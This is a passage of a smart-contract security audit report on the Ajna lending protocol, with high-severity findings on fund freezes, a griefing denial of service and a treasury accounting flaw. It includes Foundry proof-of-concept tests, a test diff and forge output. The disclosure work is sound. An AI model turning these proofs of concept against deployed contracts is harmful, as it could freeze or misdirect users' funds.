[H-01] PositionManager’smoveLiquiditycan freeze funds by removing destination index even when the move was partial
Submitted byhyh, also found byKoolexandHaipls
positionIndex.remove(params_.fromIndex)removes the PositionManager entry even when it is only partial removal as a result ofIPool(params_.pool).moveQuoteToken(...)call.
I.e. it is correct to dofromPosition.lps -= vars.lpbAmountFrom, but the resulting amount might not be zero, moveQuoteToken() are not guaranteed to clear the position as it has available liquidity constraint. In the case of partial quote funds removalpositionIndex.remove(params_.fromIndex)operation will freeze the remaining position.
Impact
Permanent fund freeze for the remaining position of LP beneficiary.
Proof of Concept
Whilepositions[params_.tokenId][params_.fromIndex]LP shares are correctly reduced by the amount returned by pool’s moveQuoteToken(), the position itself is unconditionally removed from thepositionIndexes[params_.tokenId], making any remaining funds unavailable:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323
functionmoveLiquidity(MoveLiquidityParamscalldataparams_)externaloverridemayInteract(params_.pool, params_.tokenId)nonReentrant{PositionstoragefromPosition=positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVarsmemoryvars;vars.depositTime=fromPosition.depositTime;// handle the case where owner attempts to move liquidity after they've already done soif(vars.depositTime==0)revertRemovePositionFailed();// ensure bucketDeposit accounts for accrued interestIPool(params_.pool).updateInterest();// retrieve info of bucket from which liquidity is moved(vars.bucketLP,vars.bucketCollateral,vars.bankruptcyTime,vars.bucketDeposit,) =IPool(params_.pool).bucketInfo(params_.fromIndex);// check that bucket hasn't gone bankrupt since memorializationif(vars.depositTime<=vars.bankruptcyTime)revertBucketBankrupt();// calculate the max amount of quote tokens that can be moved, given the tracked LPvars.maxQuote=_lpToQuoteToken(vars.bucketLP,vars.bucketCollateral,vars.bucketDeposit,fromPosition.lps,vars.bucketDeposit,_priceAt(params_.fromIndex));EnumerableSet.UintSetstoragepositionIndex=positionIndexes[params_.tokenId];// remove bucket index from which liquidity is moved from tracked positions>>if(!positionIndex.remove(params_.fromIndex))revertRemovePositionFailed();// update bucket set at which a position has liquidity// slither-disable-next-line unused-returnpositionIndex.add(params_.toIndex);// move quote tokens in pool(vars.lpbAmountFrom,vars.lpbAmountTo,) =IPool(params_.pool).moveQuoteToken(vars.maxQuote,params_.fromIndex,params_.toIndex,params_.expiry);PositionstoragetoPosition=positions[params_.tokenId][params_.toIndex];// update position LP state>>fromPosition.lps-=vars.lpbAmountFrom;toPosition.lps+=vars.lpbAmountTo;// update position deposit time to the from bucket deposit timetoPosition.depositTime=vars.depositTime;
Bucket can contain a mix of quote and collateral tokens, but moveLiquidity() aims to retrievevars.maxQuote = _lpToQuoteToken(...)quote funds per current exchange rate:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L222-L236
function_lpToQuoteToken(uint256bucketLP_,uint256bucketCollateral_,uint256deposit_,uint256lenderLPBalance_,uint256maxQuoteToken_,uint256bucketPrice_)purereturns(uint256quoteTokenAmount_) {uint256rate=Buckets.getExchangeRate(bucketCollateral_,bucketLP_,deposit_,bucketPrice_);quoteTokenAmount_=Maths.wmul(lenderLPBalance_,rate);if(quoteTokenAmount_>deposit_)quoteTokenAmount_=deposit_;if(quoteTokenAmount_>maxQuoteToken_)quoteTokenAmount_=maxQuoteToken_;}
There might be not enough quote deposit funds available to redeem the whole quote amount requested, which is controlled by the corresponding liquidity constraint:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L711-L719
uint256scaledLpConstraint=Maths.wmul(params_.lpConstraint,exchangeRate);if(>>params_.depositConstraint<scaledDepositAvailable&&params_.depositConstraint<scaledLpConstraint) {// depositConstraint is binding constraintremovedAmount_=params_.depositConstraint;>>redeemedLP_=Maths.wdiv(removedAmount_,exchangeRate);}
Recommended Mitigation Steps
As a most straightforward solution consider reverting when there is a remainder, i.e. whenfromPosition.lps > dust_threshold:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323
function moveLiquidity(MoveLiquidityParams calldata params_) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVars memory vars;vars.depositTime = fromPosition.depositTime;// handle the case where owner attempts to move liquidity after they've already done soif (vars.depositTime == 0) revert RemovePositionFailed();// ensure bucketDeposit accounts for accrued interestIPool(params_.pool).updateInterest();// retrieve info of bucket from which liquidity is moved(vars.bucketLP,vars.bucketCollateral,vars.bankruptcyTime,vars.bucketDeposit,) = IPool(params_.pool).bucketInfo(params_.fromIndex);// check that bucket hasn't gone bankrupt since memorializationif (vars.depositTime <= vars.bankruptcyTime) revert BucketBankrupt();// calculate the max amount of quote tokens that can be moved, given the tracked LPvars.maxQuote = _lpToQuoteToken(vars.bucketLP,vars.bucketCollateral,vars.bucketDeposit,fromPosition.lps,vars.bucketDeposit,_priceAt(params_.fromIndex));EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];// remove bucket index from which liquidity is moved from tracked positionsif (!positionIndex.remove(params_.fromIndex)) revert RemovePositionFailed();// update bucket set at which a position has liquidity// slither-disable-next-line unused-returnpositionIndex.add(params_.toIndex);// move quote tokens in pool(vars.lpbAmountFrom,vars.lpbAmountTo,) = IPool(params_.pool).moveQuoteToken(vars.maxQuote,params_.fromIndex,params_.toIndex,params_.expiry);Position storage toPosition = positions[params_.tokenId][params_.toIndex];// update position LP state>>      fromPosition.lps -= vars.lpbAmountFrom;toPosition.lps   += vars.lpbAmountTo;// update position deposit time to the from bucket deposit timetoPosition.depositTime = vars.depositTime;
ith-harvey (Ajna) confirmed

[H-02] PositionManager’smoveLiquiditycan set wrong deposit time and permanently freeze LP funds moved
Submitted byhyh, also found bynobody2018
moveLiquidity()set new destination index LP entry deposit time to be equal to the source index deposit time, while destination bucket might have defaulted after that time.
This is generally not correct as source bucket bankruptcy is controlled (i.e. LP shares that are moved are healthy), while the destination bucket’s bankruptcy time, being arbitrary, can be higher than source index deposit time, and in this case the funds will become inaccessible after such a move (i.e. healthy shares will be marked as defaulted due to incorrect deposit time used).
In other words the funds are moved from healthy non-default zone to an arbitrary point, which can be either healthy or not. In the latter case this constitutes a loss for an owner astoIndexbucket bankruptcy time exceeding deposit time means that all other retrieval operations will be blocked.
Impact
Owner will permanently lose access to the LP shares wheneverpositions[params_.tokenId][params_.toIndex]bucket bankruptcy time is greater thanpositions[params_.tokenId][params_.fromIndex].depositTime.
moveLiquidity()is a common operation, while source and destination bucket bankruptcy times can be related in an arbitrary manner, and the net impact is permanent fund freeze, so this is a fund loss without material prerequisites, setting the severity to be high.
Proof of Concept
moveLiquidity()setstoPositiondeposit time to befromPosition.depositTime:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323
functionmoveLiquidity(MoveLiquidityParamscalldataparams_)externaloverridemayInteract(params_.pool, params_.tokenId)nonReentrant{PositionstoragefromPosition=positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVarsmemoryvars;>>vars.depositTime=fromPosition.depositTime;// handle the case where owner attempts to move liquidity after they've already done soif(vars.depositTime==0)revertRemovePositionFailed();// ensure bucketDeposit accounts for accrued interestIPool(params_.pool).updateInterest();// retrieve info of bucket from which liquidity is moved(vars.bucketLP,vars.bucketCollateral,vars.bankruptcyTime,vars.bucketDeposit,) =IPool(params_.pool).bucketInfo(params_.fromIndex);// check that bucket hasn't gone bankrupt since memorializationif(vars.depositTime<=vars.bankruptcyTime)revertBucketBankrupt();// calculate the max amount of quote tokens that can be moved, given the tracked LPvars.maxQuote=_lpToQuoteToken(vars.bucketLP,vars.bucketCollateral,vars.bucketDeposit,fromPosition.lps,vars.bucketDeposit,_priceAt(params_.fromIndex));EnumerableSet.UintSetstoragepositionIndex=positionIndexes[params_.tokenId];// remove bucket index from which liquidity is moved from tracked positionsif(!positionIndex.remove(params_.fromIndex))revertRemovePositionFailed();// update bucket set at which a position has liquidity// slither-disable-next-line unused-returnpositionIndex.add(params_.toIndex);// move quote tokens in pool(vars.lpbAmountFrom,vars.lpbAmountTo,) =IPool(params_.pool).moveQuoteToken(vars.maxQuote,params_.fromIndex,params_.toIndex,params_.expiry);PositionstoragetoPosition=positions[params_.tokenId][params_.toIndex];// update position LP statefromPosition.lps-=vars.lpbAmountFrom;toPosition.lps+=vars.lpbAmountTo;// update position deposit time to the from bucket deposit time>>toPosition.depositTime=vars.depositTime;
I.e. there is no check forparams_.toIndexbucket situation, the time is just copied.
While there is checking logic in LenderActions, which checks fortoBucketbankruptcy and sets the time accordingly:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LenderActions.sol#L315-L327
vars.toBucketDepositTime=toBucketLender.depositTime;if(vars.toBucketBankruptcyTime>=vars.toBucketDepositTime) {// bucket is bankrupt and deposit was done before bankruptcy time, reset lender lp amounttoBucketLender.lps=toBucketLP_;// set deposit time of the lender's to bucket as bucket's last bankruptcy timestamp + 1 so deposit won't get invalidatedvars.toBucketDepositTime=vars.toBucketBankruptcyTime+1;}else{toBucketLender.lps+=toBucketLP_;}// set deposit time to the greater of the lender's from bucket and the target buckettoBucketLender.depositTime=Maths.max(vars.fromBucketDepositTime,vars.toBucketDepositTime);
This way, while bucket structure deposit time will be controlled and updated, PositionManager’s structure will have the deposit time copied over.
In the case whenpositions[params_.tokenId][params_.fromIndex].depositTimewas less thanparams_.toIndexbankruptcyTime, this will freeze these LP funds as further attempts to use them will be blocked:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L285
functionmoveLiquidity(MoveLiquidityParamscalldataparams_)externaloverridemayInteract(params_.pool, params_.tokenId)nonReentrant{PositionstoragefromPosition=positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVarsmemoryvars;>>vars.depositTime=fromPosition.depositTime;// handle the case where owner attempts to move liquidity after they've already done soif(vars.depositTime==0)revertRemovePositionFailed();// ensure bucketDeposit accounts for accrued interestIPool(params_.pool).updateInterest();// retrieve info of bucket from which liquidity is moved(vars.bucketLP,vars.bucketCollateral,>>vars.bankruptcyTime,vars.bucketDeposit,) =IPool(params_.pool).bucketInfo();// check that bucket hasn't gone bankrupt since memorialization>>if(vars.depositTime<=vars.bankruptcyTime)revertBucketBankrupt();
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L352-L372
functionreedemPositions(RedeemPositionsParamscalldataparams_)externaloverridemayInteract(params_.pool, params_.tokenId) {EnumerableSet.UintSetstoragepositionIndex=positionIndexes[params_.tokenId];...for(uint256i=0;i<indexesLength; ) {index=params_.indexes[i];Positionmemoryposition=positions[params_.tokenId][index];if(position.depositTime==0||position.lps==0)revertRemovePositionFailed();// check that bucket didn't go bankrupt after memorialization>>if(_bucketBankruptAfterDeposit(pool,index,position.depositTime))revertBucketBankrupt();
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L436-L443
function_bucketBankruptAfterDeposit(IPoolpool_,uint256index_,uint256depositTime_)internalviewreturns(bool) {(, ,uint256bankruptcyTime, , ) =pool_.bucketInfo(index_);>>returndepositTime_<=bankruptcyTime;}
Recommended Mitigation Steps
Consider using the resulting time of the destination position, for example:
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L262-L323
function moveLiquidity(MoveLiquidityParams calldata params_) external override mayInteract(params_.pool, params_.tokenId) nonReentrant {Position storage fromPosition = positions[params_.tokenId][params_.fromIndex];MoveLiquidityLocalVars memory vars;vars.depositTime = fromPosition.depositTime;...Position storage toPosition = positions[params_.tokenId][params_.toIndex];// update position LP statefromPosition.lps -= vars.lpbAmountFrom;toPosition.lps   += vars.lpbAmountTo;-       // update position deposit time to the from bucket deposit time+       // update position deposit time with the renewed to bucket deposit time+       (, vars.depositTime) = pool.lenderInfo(params_.toIndex, address(this));toPosition.depositTime = vars.depositTime;
Notice, that this time value will be influenced by the other PositionManager positions in theparams_.toIndexbucket, but the surface described will be closed as it will be controlled againstparams_.toIndexbucket bankruptcy time.
ith-harvey (Ajna) confirmed

[H-03] Position NFT can be spammed with insignificant positions by anyone until rewards DoS
Submitted by0xTheC0der, also found byaviggiano,ro1sharkm,DadeKuma,evmboi32,sakshamguruji,juancito,rvierdiiev,Haipls,kodyvim,SpicyMeatball,ToonVH, andazhar
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485
ThePositionManager.memorializePositions(params_)method can be called byanyone(per design, see 3rd party test cases) and allowsinsignificantlysmall (any value > 0) positions to be attached toanyoneelse’s positions NFT, see PoC. As a result, thepositionIndexes[params_.tokenId]storage array for an NFT with given token ID can be spammed with positions without the NFT owner’s consent.
Therefore, thePositionManager.getPositionIndexesFiltered(tokenId_)method might exceed the block gas limit when iterating thepositionIndexes[tokenId_]storage array. However, theRewardsManager.calculateRewards(…)andRewardsManager._calculateAndClaimRewards(…)methods rely on the aforementioned method to succeed in order to calculate and pay rewards.
All in all, a griefer can spam anyone’s position NFT with insignificant positions until the rewards mechanism fails for the NFT owner due to DoS (gas limit). Side note: A position NFT also cannot be burned as long as such insignificant positions are attached to it, seePositionManager.burn(…).
Proof of Concept
The followingdiffis based on the existing test casetestMemorializePositionsinPositionManager.t.soland demonstrates that insignificant positions can be attached by anyone.
diff --git a/ajna-core/tests/forge/unit/PositionManager.t.sol b/ajna-core/tests/forge/unit/PositionManager.t.solindex bf3aa40..56c85d1 100644--- a/ajna-core/tests/forge/unit/PositionManager.t.sol+++ b/ajna-core/tests/forge/unit/PositionManager.t.sol@@ -122,6 +122,7 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract*/function testMemorializePositions() external {address testAddress = makeAddr("testAddress");+        address otherAddress = makeAddr("otherAddress");uint256 mintAmount  = 10000 * 1e18;_mintQuoteAndApproveManagerTokens(testAddress, mintAmount);@@ -134,17 +135,17 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract_addInitialLiquidity({from:   testAddress,-            amount: 3_000 * 1e18,+            amount: 1, //3_000 * 1e18,index:  indexes[0]});_addInitialLiquidity({from:   testAddress,-            amount: 3_000 * 1e18,+            amount: 1, //3_000 * 1e18,index:  indexes[1]});_addInitialLiquidity({from:   testAddress,-            amount: 3_000 * 1e18,+            amount: 1, // 3_000 * 1e18,index:  indexes[2]});@@ -165,17 +166,20 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract// allow position manager to take ownership of the positionuint256[] memory amounts = new uint256[](3);-        amounts[0] = 3_000 * 1e18;-        amounts[1] = 3_000 * 1e18;-        amounts[2] = 3_000 * 1e18;+        amounts[0] = 1; //3_000 * 1e18;+        amounts[1] = 1; //3_000 * 1e18;+        amounts[2] = 1; //3_000 * 1e18;_pool.increaseLPAllowance(address(_positionManager), indexes, amounts);// memorialize quote tokens into minted NFT+        changePrank(otherAddress); // switch other address (not owner of NFT)vm.expectEmit(true, true, true, true);-        emit TransferLP(testAddress, address(_positionManager), indexes, 9_000 * 1e18);+        emit TransferLP(testAddress, address(_positionManager), indexes, 3 /*9_000 * 1e18*/);vm.expectEmit(true, true, true, true);emit MemorializePosition(testAddress, tokenId, indexes);-        _positionManager.memorializePositions(memorializeParams);+        _positionManager.memorializePositions(memorializeParams);  // switch back to test address (owner of NFT)+        changePrank(testAddress);+// check memorialization successuint256 positionAtPriceOneLP = _positionManager.getLP(tokenId, indexes[0]);
Tools Used
VS Code, Foundry
Recommended Mitigation Steps
Requiring that ThePositionManager.memorializePositions(params_)can only be called by the NFT owner or anyone who has approval would help but break the 3rd party test cases.
Alternatively, one could enforce a minimum position value to make this griefing attack extremely unattractive.
ith-harvey (Ajna) confirmed

[H-04] Delegation rewards are not counted toward granting fund
Submitted byKenshin, also found byhyh,REACH,rbserver,Ruhum,Dug,0xRobocop, andnobody2018
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L236-L265https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L216-L217
Each period reserves a reward for granting up to3% (GBC: Global Budget Constraint). The GBC is split into two parts:
90% for proposal granting. Any proposal requesting more than 90% willrevert. The total amount requested across winning proposals must notexceed this percentage.10% for voters who have participated in that distribution period as an incentive.
Voters who have participated can claim their reward after the period has ended viaclaimDelegateReward(). However, the claim function does not account for the claimed reward towards treasury granting. As a result, the treasury technically reserves up to 90% in each period while actually granting 100%.
Consider this example:
The treasury has a total of1000 AJNA. 3% is reserved for this period, resulting in a GBC of30 AJNA. The treasury is updated to1000 - 30 = 970 AJNA.90% is for proposals (27 AJNA) and 10% is for voters (3 AJNA).Assume all27 AJNAare fully granted among winning proposals.Assume 10 voters in total, all fully voted and have equal voting power. Each voter receives0.3 AJNA, totaling3 AJNA.The treasury has spent27 AJNA + 3 AJNA, leaving an actual balance of970 AJNA.This round has ended and the treasury updates its balance before starting a new one usingthis logic.970 += (30 - 27)=973.The treasury accounts for973 AJNAwhile having only970 AJNAin actuality.
More detailed analysis
When the current period has ended and before starting a new one, the treasury willre-account its amount in case the last period did not utilize all the reserved reward. For example, if the last period granted only 80% of the GBC among winning proposals, the remaining 10% will be re-added to the treasury.
File:ajna-grants/src/grants/base/StandardFunding.sol197:function_updateTreasury(198:uint24distributionId_199:    )private{200:bytes32fundedSlateHash=_distributions[distributionId_].fundedSlateHash;201:uint256fundsAvailable=_distributions[distributionId_].fundsAvailable;202:203:uint256[]memoryfundingProposalIds=_fundedProposalSlates[fundedSlateHash];204:205:uint256totalTokensRequested;206:uint256numFundedProposals=fundingProposalIds.length;207:208:for(uinti=0;i<numFundedProposals; ) {209:Proposalmemoryproposal=_standardFundingProposals[fundingProposalIds[i]];210:211:totalTokensRequested+=proposal.tokensRequested;212:213:unchecked{ ++i; }214:        }215:216:// readd non distributed tokens to the treasury217:treasury+= (fundsAvailable-totalTokensRequested);
In the code block above,fundsAvailablerepresents 100% of the GBC andtotalTokensRequestedrepresents up to 90% of the GBC. As a result, the treasury always adds 10% of the reserve back to its accounting.
Proof of Concept
The following PoC code is quite long because it must go through all stages. Please append and run this function in the fileajna-grants/test/unit/StandardFunding.t.sol. The test should pass without errors.
File:ajna-grants/test/unit/StandardFunding.t.sol/*1. startDistributionPeriod2. proposeStandard3. screeningVote4. fundingVote5. updateSlate6. executeStandard7. claimDelegateReward*/functiontestPoCTreasuryPrecisionLoss()public{// 14 tokenholders self delegate their tokens to enable voting on the proposals_selfDelegateVoters(_token,_votersArr);uintallVotersInitBalance=50_000_000*1e18;emitlog_named_uint("Treasury initial amount",_grantFund.treasury());vm.roll(_startBlock+150);/* =========================1. startDistributionPeriod()========================= */assertEq(_token.balanceOf(address(_grantFund)),500_000_000*1e18,"No token should have left the treasury");uint24distributionId=_grantFund.startNewDistributionPeriod();assertEq(_grantFund.getDistributionId(),distributionId,"Should have the same ID");uintoldTreasury=_grantFund.treasury();emitlog_named_uint("Treasury after start, deduct 3%",oldTreasury);(, , ,uint128gbc, , ) =_grantFund.getDistributionPeriodInfo(distributionId);assertEq(gbc,15_000_000*1e18);emitlog_named_uint("GBC",uint(gbc));assertEq(oldTreasury+gbc,500_000_000*1e18,"Should be equal to the initial treasury fund");/* =================2. proposeStandard()================= */// Request 9/10 of GBC (maximal)// 9/10 of GBC = 13_500_000 == 8_500_000 + 5_000_000 (all in WAD uint)TestProposalParams[]memorytestProposalParams=newTestProposalParams[](2);testProposalParams[0] =TestProposalParams(address(this),8_500_000*1e18);testProposalParams[1] =TestProposalParams(address(this),5_000_000*1e18);TestProposal[]memorytestProposals=_createNProposals(_grantFund,_token,testProposalParams);assertEq(testProposals.length,2,"Should created exact 2 proposals");vm.roll(_startBlock+200);/* ===============3. screeningVote()=============== */// Demonstrate only 6 voters, all fully use their vote power (50_000_000 * 1e18)// #0 got 2 votes// #1 got 4 votes_screeningVote(_grantFund,_tokenHolder1,testProposals[0].proposalId,_getScreeningVotes(_grantFund,_tokenHolder1));_screeningVote(_grantFund,_tokenHolder2,testProposals[0].proposalId,_getScreeningVotes(_grantFund,_tokenHolder2));_screeningVote(_grantFund,_tokenHolder3,testProposals[1].proposalId,_getScreeningVotes(_grantFund,_tokenHolder3));_screeningVote(_grantFund,_tokenHolder4,testProposals[1].proposalId,_getScreeningVotes(_grantFund,_tokenHolder4));_screeningVote(_grantFund,_tokenHolder5,testProposals[1].proposalId,_getScreeningVotes(_grantFund,_tokenHolder5));_screeningVote(_grantFund,_tokenHolder6,testProposals[1].proposalId,_getScreeningVotes(_grantFund,_tokenHolder6));// /* =============// 4. fundingVote()// ============= */// skip time to move from screening period to funding periodvm.roll(_startBlock+600_000);GrantFund.Proposal[]memoryproposals=_getProposalListFromProposalIds(_grantFund,_grantFund.getTopTenProposals(distributionId));assertEq(proposals.length,2);// Proposals should be sorted descending according to votes received so #1 should be the first and #0 should be the secondassertEq(proposals[0].proposalId,testProposals[1].proposalId,"Should have the correct proposalId #1");assertEq(proposals[0].votesReceived,200_000_000*1e18,"Should have the voting score of 4 voters");assertEq(proposals[1].proposalId,testProposals[0].proposalId,"Should have the correct proposalId #0");assertEq(proposals[1].votesReceived,100_000_000*1e18,"Should have the voting score of 2 voters");// funding period votes for two competing slates, 1, or 2 and 3// #1 got 3 funding votes// #0 got 3 funding votes_fundingVote(_grantFund,_tokenHolder1,proposals[0].proposalId,voteYes,50_000_000*1e18);_fundingVote(_grantFund,_tokenHolder2,proposals[1].proposalId,voteYes,50_000_000*1e18);_fundingVote(_grantFund,_tokenHolder3,proposals[1].proposalId,voteYes,50_000_000*1e18);_fundingVote(_grantFund,_tokenHolder4,proposals[1].proposalId,voteYes,50_000_000*1e18);_fundingVote(_grantFund,_tokenHolder5,proposals[0].proposalId,voteYes,50_000_000*1e18);_fundingVote(_grantFund,_tokenHolder6,proposals[0].proposalId,voteYes,50_000_000*1e18);// Ensure that all 6 holders have fully voted.for(uinti=0;i<6;i++) {(uint128voterPower,uint128votingPowerRemaining,uint256votesCast) =_grantFund.getVoterInfo(distributionId,_votersArr[i]);assertEq(voterPower,2_500_000_000_000_000*1e18,"Should have 50m^2 voting power");assertEq(votingPowerRemaining,0,"Should have fully voted");}// /* =============// 5. updateSlate()// ============= */// skip to the end of the DistributionPeriodvm.roll(_startBlock+650_000);// Updating potential Proposal Slate to include proposal that is in topTenProposal (funding Stage)uint256[]memoryslate=newuint256[](proposals.length);// length = 2slate[0] =proposals[0].proposalId;slate[1] =proposals[1].proposalId;require(_grantFund.updateSlate(slate,distributionId),"Should update slate success");(, , , , ,bytes32slateHash) =_grantFund.getDistributionPeriodInfo(distributionId);assertTrue(slateHash!=bytes32(0));proposals=_getProposalListFromProposalIds(_grantFund,_grantFund.getFundedProposalSlate(slateHash));// /* =================// 6. executeStandard()// ================= */// skip to the end of the Distribution's challenge periodvm.roll(_startBlock+700_000);// execute funded proposalsassertEq(_token.balanceOf(address(this)),0,"This contract should have 0 token amount");_grantFund.executeStandard(testProposals[0].targets,testProposals[0].values,testProposals[0].calldatas,keccak256(bytes(testProposals[0].description)));_grantFund.executeStandard(testProposals[1].targets,testProposals[1].values,testProposals[1].calldatas,keccak256(bytes(testProposals[1].description)));assertEq(testProposals[0].tokensRequested+testProposals[1].tokensRequested,_token.balanceOf(address(this)),"The contract should received correct granted amount");emitlog_named_uint("totalTokensRequested",_token.balanceOf(address(this)));assertEq(_token.balanceOf(address(this)),gbc*9/10,"Should be equal to 90% of GBC");proposals=_getProposalListFromProposalIds(_grantFund,_grantFund.getFundedProposalSlate(slateHash));assertTrue(proposals[0].executed&&proposals[1].executed,"Should have successfully executed");// /* =================// 7. claimDelegateReward()// ================= */// Claim delegate reward for all delegatees// delegates who didn't vote with their full power receive fewer rewardsuinttotalDelegationRewards;for(uinti=0;i<_votersArr.length;i++) {uintestimatedRewards=_grantFund.getDelegateReward(distributionId,_votersArr[i]);changePrank(_votersArr[i]);if(i>5) {// these are holders who haven't participated in this period, should have 0 reward// _tokenHolder7 and abovevm.expectRevert(IStandardFunding.DelegateRewardInvalid.selector);uintactualRewards=_grantFund.claimDelegateReward(distributionId);assertTrue(estimatedRewards==0&&actualRewards==0,"Should be ineligible for rewards");assertFalse(_grantFund.hasClaimedReward(distributionId,_votersArr[i]),"Should unable to claim");assertEq(_token.balanceOf(_votersArr[i]),allVotersInitBalance,"Balance should be the same as starting");}else{// these are holders who have voted// _tokenHolder1 - 6uintactualRewards=_grantFund.claimDelegateReward(distributionId);assertEq(estimatedRewards,actualRewards,"Should received the exact reward amount");assertTrue(estimatedRewards!=0&&actualRewards!=0,"Should be eligible for rewards");assertTrue(_grantFund.hasClaimedReward(distributionId,_votersArr[i]),"Should claim successfully");assertEq(_token.balanceOf(_votersArr[i]),allVotersInitBalance+actualRewards,"Should have the final balance equal to init+reward");totalDelegationRewards+=actualRewards;}}emitlog_named_uint("Total claimed rewards",totalDelegationRewards);assertEq(totalDelegationRewards,gbc/10,"Should be equal to 10% of GBC");assertEq(totalDelegationRewards+_token.balanceOf(address(this)),gbc,"10% + 90% = 100%");assertEq(totalDelegationRewards+_token.balanceOf(address(this)) +oldTreasury,500_000_000*1e18,"10% + 90% + remaining = initial treasury");emitlog_named_uint("Treasury at the end of the period (should be the same as started)",_grantFund.treasury());// Put the treasury back to the same value as the last period to have the same GBC for easier to compare.// Remember this equation? "10% + 90% + remaining = initial treasury"// Current _grantFund.treasury() = remaining.// _token.balanceOf(address(this)) = 90%// _grantFund.startNewDistributionPeriod() -> _grantFund._updateTreasury() = 10% (because of the invalid logic)changePrank(address(this));_token.approve(address(_grantFund),_token.balanceOf(address(this)));// only put 90% back to the treasury_grantFund.fundTreasury(_token.balanceOf(address(this)));// 10% + (90%&remaining) = initial treasuryassertEq(totalDelegationRewards+_grantFund.treasury(),500_000_000*1e18,"Should be equal to the initial treasury");// The function put 10% back in, while in the actual all 100% has been spent. Loss 10%._grantFund.startNewDistributionPeriod();emitlog_named_uint("Treasury at the new period (got updated)",_grantFund.treasury());assertEq(_token.balanceOf(address(_grantFund)),498_500_000*1e18,"Should be initial-10%");emitlog_named_uint("treasury actual balance",_token.balanceOf(address(_grantFund)));// The same GBC evidenced that treasury = 500_000_000 * 1e18 at the time it was calculated,// But the actual balance is 500_000_000 * 1e18 - 10% = 498_500_000 * 1e18.(, , ,uint128newGbc, , ) =_grantFund.getDistributionPeriodInfo(distributionId);assertEq(oldTreasury+gbc,_grantFund.treasury() +gbc,"Should have the same GBC as previous period");assertEq(gbc,newGbc,"Should have the same GBC as previous period");}
run: forge test --match-test testPoCTreasuryPrecisionLoss -vvRunning 1 test for test/unit/StandardFunding.t.sol:StandardFundingGrantFundTest[PASS] testPoCTreasuryPrecisionLoss() (gas: 3451937)Logs:Treasury initial amount: 500000000000000000000000000Treasury after start, deduct 3%: 485000000000000000000000000GBC: 15000000000000000000000000totalTokensRequested: 13500000000000000000000000Total claimed rewards: 1500000000000000000000000Treasury at the end of the period (should be the same as started): 485000000000000000000000000Treasury at the new period (got updated): 485000000000000000000000000treasury actual balance: 498500000000000000000000000Test result: ok. 1 passed; 0 failed; finished in 1.20s
Tools Used
Manual reviewFoundry
Recommended Mitigation Steps
If it is safe to assume that all periods will always have 10% for delegation rewards, the contract should calculate only 90% offundsAvailablewhen updating the treasury.
File: ajna-grants/src/grants/base/StandardFunding.sol197:    function _updateTreasury(198:        uint24 distributionId_199:    ) private {200:        bytes32 fundedSlateHash = _distributions[distributionId_].fundedSlateHash;201:        uint256 fundsAvailable  = _distributions[distributionId_].fundsAvailable;...216:        // readd non distributed tokens to the treasury+217:        treasury += ((fundsAvailable * 9/10) - totalTokensRequested);
Remark
TheclaimDelegateReward()function usesMaths.wmul(), which automatically rounds the multiplication result up or down. For example,Maths.wmul(1, 0.5 * 1e18) = 1(rounding up) whileMaths.wmul(1, 0.49 * 1e18) = 0(rounding down). As a result,rewardClaimed_can lose precision for small decimal amounts and token holders typically have small fractions of tokens down to1 wei. It is uncertain, but the total actual paid rewards could be more than 10% if rounded up, resulting in an insignificant loss of precision in the treasury. However, ifrewardClaimed_is deducted fromfundsAvailable, it could lead to an integer underflow revert iffundsAvailable - totalClaimed - totalTokensRequested = 100% - 10.xx% - 90%, which exceeds 100%.
Picodes (judge) increased severity to High
MikeHathaway (Ajna) confirmed via duplicate issue#263

[H-05] Incorrect calculation of the remainingupdatedRewardsleads to possible underflow error
Submitted byHaipls, also found byKoolexandVagner
https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L549https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L725
RewardsManage.solkeeps track of thetotal number of rewards collected per epochfor all pools:
